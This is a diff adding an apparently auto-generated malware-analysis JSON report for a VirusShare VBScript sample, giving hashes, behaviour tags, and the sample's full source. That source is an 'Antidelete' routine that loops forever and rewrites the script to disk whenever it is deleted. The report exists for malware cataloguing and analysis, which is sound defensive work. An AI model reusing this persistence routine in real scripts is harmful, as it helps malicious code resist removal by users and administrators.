@@ -1,0 +1,49 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "createtextfile": "May create a text file",
+            "write": "May write to a file"
+        },
+        "macro": "'This function must be the last one called, cause it never ends.\n'If it detects that the file has been deleted, it'screated again.\nFunction Antidelete()\nSet fso = CreateObject(\"scripting.filesystemobject\")\nSet Myself = fso.opentextfile(wscript.scriptfullname, 1)\nMyCode = Myself.readall\nMyself.Close\nDo\nIf Not (fso.fileexists(wscript.scriptfullname)) Then\nSet Myself = fso.createtextfile(wscript.scriptfullname, True)\nMyself.write MyCode\nMyself.Close\nEnd If\nLoop\nEnd Function\n"
+    },
+    "filename": "VirusShare_0bf41d88825fa22f8dc144b7134c9590",
+    "filesize": 493,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0bf41d88825fa22f8dc144b7134c9590",
+        "sha1": "ced1abc04eaa72a64d19ea08453dc31f97a06188",
+        "sha256": "388fddc1ffce4eceeea51e89154402e05e930d88703d875822e9aabccc201228"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'This function must be the last one called, cause it never ends.",
+            "'If it detects that the file has been deleted, it'screated again.",
+            "Function Antidelete()",
+            "Set fso = CreateObject(\"scripting.filesystemobject\")",
+            "Set Myself = fso.opentextfile(wscript.scriptfullname, 1)",
+            "MyCode = Myself.readall",
+            "Myself.Close",
+            "If Not (fso.fileexists(wscript.scriptfullname)) Then",
+            "Set Myself = fso.createtextfile(wscript.scriptfullname, True)",
+            "Myself.write MyCode",
+            "Myself.Close",
+            "End If",
+            "Loop",
+            "End Function"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.260129",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
